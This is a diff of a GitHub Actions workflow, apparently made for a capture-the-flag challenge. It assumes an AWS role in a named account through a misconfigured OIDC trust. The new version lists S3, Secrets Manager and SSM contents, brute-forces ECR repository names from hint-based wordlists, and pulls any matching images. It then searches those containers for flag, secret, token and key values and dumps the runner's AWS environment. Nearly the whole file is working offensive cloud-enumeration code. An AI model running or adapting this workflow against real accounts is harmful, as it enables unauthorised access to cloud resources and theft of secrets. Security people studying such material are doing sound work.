@@ -1,141 +1,113 @@
-name: ECR Repository Discovery
+# .github/workflows/fetch.yml
+name: Explore AWS ECR & Containers
+
+# trigger manually and on push to main (adjust as needed)
 on:
   workflow_dispatch:
+  push:
+    branches:
+      - main
 
 permissions:
-  id-token: write
+  id-token: write    # needed for OIDC assume-role
   contents: read
 
 jobs:
-  discover-ecr:
+  assume-and-explore:
     runs-on: ubuntu-latest
+    environment: ci
+    env:
+      AWS_REGION: us-east-1
+      AWS_DEFAULT_REGION: us-east-1
+      ECR_REGISTRY: 396961015104.dkr.ecr.us-east-1.amazonaws.com
+
     steps:
-      - name: Configure AWS credentials
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Configure AWS credentials (assume role via OIDC)
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
-          aws-region: us-east-1
+          aws-region: ${{ env.AWS_REGION }}
 
-      - name: Login to ECR
-        run: |
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+      - name: Show caller identity
+        run: aws sts get-caller-identity
 
-      - name: Systematic ECR Repository Discovery
+      - name: Basic AWS checks (S3, ECR, Secrets, SSM)
         run: |
-          echo "=== Starting systematic ECR repository discovery ==="
-          
-          # Comprehensive wordlist based on CTF patterns and challenge hints
-          REPOS=(
-            # From challenge description
-            "forensic" "forensics" "forensic-challenge"
-            "imaginary" "imagine" "never-imagined"
-            "misconfigure" "misconfigured" "misconfiguration"
-            "oidc" "github-oidc" "oidc-misconfig"
-            "fiddling" "fiddle" "workflow-fiddling"
-            
-            # Common CTF patterns
-            "ctf" "challenge" "flag" "secret"
-            "docker" "container" "image" "repo"
-            "ecr" "ecr-challenge" "aws-ctf"
-            
-            # Combinations
-            "forensic-docker" "docker-forensic"
-            "imaginary-forensic" "forensic-imaginary"
-            "oidc-forensic" "forensic-oidc"
-            "github-forensic" "forensic-github"
-            "actions-forensic" "forensic-actions"
-            
-            # Reverse phrases
-            "challenge-forensic" "challenge-imaginary"
-            "misconfig-forensic" "misconfig-imaginary"
-            "docker-challenge" "container-challenge"
-            
-            # Simple variations
-            "test" "demo" "example" "sample"
-            "app" "web" "api" "service"
-            "backend" "frontend" "database"
+          echo "=== S3 buckets (list) ==="
+          aws s3 ls || echo "No S3 list access or access denied"
+
+          echo "=== ECR describe-repositories ==="
+          aws ecr describe-repositories --region $AWS_REGION || echo "No ECR access or no repositories"
+
+          echo "=== Secrets Manager list (read-only attempt) ==="
+          aws secretsmanager list-secrets --max-results 10 || echo "No SecretsManager access"
+
+          echo "=== SSM Parameter Store describe ==="
+          aws ssm describe-parameters --max-items 10 || echo "No SSM access"
+
+      - name: Login to ECR (get-login-password)
+        run: |
+          echo "=== Getting ECR login password and docker login ==="
+          aws ecr get-login-password --region $AWS_REGION | docker login --username AWS --password-stdin $ECR_REGISTRY
+          echo "Docker login done (if credentials allowed)."
+
+      - name: Discover common-named images and explore any found
+        run: |
+          set -euo pipefail
+          PHRASES=(
+            "never-imagined" "never_imagined" "i-never-imagined"
+            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
+            "github-actions-insecure" "actions-insecure" "insecure-actions"
+            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
+            "download-docker-image" "docker-download" "image-download"
+            "where-docker" "from-where" "where-from"
+            "oidc-cool" "cool-oidc" "oidc-misconfigured"
+            "be-careful" "careful-oidc" "oidc-careful"
           )
-          
-          found=0
-          for repo in "${REPOS[@]}"; do
-            echo -n "Testing: $repo ... "
-            
-            # Try to describe images (quiet check)
-            if aws ecr describe-images --repository-name "$repo" --max-items 1 --region us-east-1 >/dev/null 2>&1; then
-              echo "✅ FOUND!"
-              echo "=== Repository $repo exists ==="
-              aws ecr describe-images --repository-name "$repo" --region us-east-1
-              found=1
+
+          # also try to list repos (may return [] if no permission)
+          echo "Attempting to list ECR repositories in $AWS_REGION"
+          aws ecr describe-repositories --region $AWS_REGION || true
+
+          echo "Trying common phrase-based images in $ECR_REGISTRY"
+          FOUND=0
+          for phrase in "${PHRASES[@]}"; do
+            IMAGE="$ECR_REGISTRY/$phrase:latest"
+            echo "Trying: $IMAGE"
+            if docker pull "$IMAGE" 2>/dev/null; then
+              echo "🎉 FOUND IMAGE: $IMAGE"
+              docker images | grep "$phrase" || true
+
+              echo "=== List files that might contain flags inside the container (top matches) ==="
+              docker run --rm "$IMAGE" sh -c 'find / -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -n 50' || true
+
+              echo "=== Print environment variables inside container (search for FLAG/SECRET) ==="
+              docker run --rm "$IMAGE" sh -c 'env || true' | egrep -i "FLAG|SECRET|TOKEN|KEY" || true
+
+              echo "=== Try to cat obvious files from container (if present) ==="
+              docker run --rm "$IMAGE" sh -c 'for f in /root/* /home/* /app/* /workspace/* /usr/src/*; do [ -f "$f" ] && echo "---- $f ----" && sed -n "1,200p" "$f" || true; done' || true
+
+              FOUND=1
               break
-            else
-              echo "❌ not found"
             fi
           done
-          
-          if [ $found -eq 0 ]; then
-            echo "=== No repositories found in wordlist ==="
+
+          if [ "$FOUND" -eq 0 ]; then
+            echo "No phrase-based images found. You can add more names or inspect ECR via AWS console if allowed."
           fi
 
-      - name: Try Docker Pull Anyway
-        run: |
-          echo "=== Attempting direct Docker pulls ==="
-          
-          # Even if describe fails, try pulling common names directly
-          PULL_REPOS=(
-            "forensic" "imaginary" "oidc" "challenge" "ctf" "flag"
-            "forensic-challenge" "imaginary-challenge" "oidc-challenge"
-          )
-          
-          for repo in "${PULL_REPOS[@]}"; do
-            echo "Attempting to pull: $repo"
-            if docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest 2>/dev/null; then
-              echo "🎉 SUCCESS! Pulled $repo:latest"
-              echo "Image details:"
-              docker images | grep $repo
-              echo "=== Checking container ==="
-              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest sh -c 'echo "Container ran successfully"'
-              break
-            elif docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:v1 2>/dev/null; then
-              echo "🎉 SUCCESS! Pulled $repo:v1"
-              docker images | grep $repo
-              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:v1 sh -c 'echo "Container ran successfully"'
-              break
-            fi
-          done
+      - name: Save docker image list (debug)
+        run: docker images --format "{{.Repository}}:{{.Tag}} {{.ID}}"
 
-      - name: Check ECR Registry Level
+      - name: Dump environment and workflow directory
         run: |
-          echo "=== Checking ECR registry-level access ==="
-          aws ecr describe-registry --region us-east-1 2>/dev/null && echo "Can describe registry" || echo "Cannot describe registry"
-          
-          echo "=== Checking replication configuration ==="
-          aws ecr describe-replication-configurations --region us-east-1 2>/dev/null && echo "Can check replication" || echo "Cannot check replication"
-
-      - name: Final Discovery Attempt
-        run: |
-          echo "=== Final comprehensive attempt ==="
-          
-          # Try some wildcard patterns that might exist
-          FINAL_ATTEMPTS=(
-            "forensics-challenge" "forensic-challenge-2025" "2025-forensic"
-            "imaginary-forensic" "forensic-imaginary" 
-            "oidc-forensics" "github-forensics"
-            "ctf-forensic" "challenge-forensic"
-            "docker-forensic-image" "forensic-docker-image"
-          )
-          
-          for repo in "${FINAL_ATTEMPTS[@]}"; do
-            echo "Trying: $repo"
-            if aws ecr describe-images --repository-name "$repo" --max-items 1 --region us-east-1 >/dev/null 2>&1; then
-              echo "🎉 FOUND REPOSITORY: $repo"
-              echo "Listing images:"
-              aws ecr list-images --repository-name "$repo" --region us-east-1
-              
-              echo "Attempting to pull..."
-              docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest && \
-                echo "Successfully pulled image" && \
-                docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest || \
-                echo "Could not run container"
-              break
-            fi
-          done
+          echo "=== ENV related to AWS/OIDC ==="
+          env | grep -i aws || true
+          echo "=== Current directory listing ==="
+          pwd
+          ls -la
+          echo "=== .github contents ==="
+          ls -la .github || true
